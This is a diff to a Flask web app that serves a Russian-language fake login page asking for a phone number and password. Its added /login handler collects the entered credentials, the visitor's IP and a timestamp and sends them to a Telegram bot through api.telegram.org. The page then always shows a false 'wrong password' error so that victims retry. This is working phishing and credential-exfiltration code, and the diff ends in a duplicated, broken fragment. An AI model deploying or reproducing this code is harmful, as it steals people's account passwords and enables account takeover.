@@ -1,9 +1,12 @@
 from flask import Flask, request, render_template_string
-import requests, datetime, os
+import requests
+import datetime
+import os
 
 app = Flask(__name__)
 
-HTML = """<!DOCTYPE html>
+HTML = """
+<!DOCTYPE html>
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
@@ -63,6 +66,57 @@ HTML = """<!DOCTYPE html>
                 <input type="password" name="password" placeholder="Введите пароль" required>
             </div>
             <button type="submit" class="btn-login">Войти</button>
+            <div class="error" id="errorMsg">Неверный номер или пароль. Попробуйте снова.</div>
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p style="margin-top: 12px; color: #707579; font-size: 14px;">Подождите, выполняется вход...</p>
+            </div>
+        </form>
+        <div class="footer">
+            <a href="#">Забыли пароль?</a> · <a href="#">Регистрация</a>
+        </div>
+    </div>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            document.getElementById('loading').style.display = 'block';
+            document.querySelector('.btn-login').style.display = 'none';
+            document.getElementById('errorMsg').style.display = 'none';
+            var formData = new FormData(this);
+            fetch('/login', { method: 'POST', body: formData })
+            .then(function() {
+                document.getElementById('loading').style.display = 'none';
+                document.querySelector('.btn-login').style.display = 'block';
+                document.getElementById('errorMsg').style.display = 'block';
+                document.getElementById('loginForm').reset();
+            });
+        });
+    </script>
+</body>
+</html>
+"""
+
+@app.route("/")
+def index():
+    return render_template_string(HTML)
+
+@app.route("/login", methods=["POST"])
+def login():
+    phone = request.form.get("phone", "")
+    password = request.form.get("password", "")
+    ip = request.remote_addr
+    time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    
+    bot_token = os.environ.get("BOT_TOKEN", "")
+    chat_id = os.environ.get("CHAT_ID", "")
+    
+    msg = f"🔐 НОВЫЙ ЛОГ\n📱 Телефон: +7 {phone}\n🔑 Пароль: {password}\n🌐 IP: {ip}\n🕐 Время: {time}"
+    try:
+        requests.get(f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={msg}")
+    except:
+        pass
+    
+    return "ok", 200            <button type="submit" class="btn-login">Войти</button>
             <div class="error" id="errorMsg">Неверный номер или пароль. Попробуйте снова.</div>
             <div class="loading" id="loading">
                 <div class="spinner"></div>
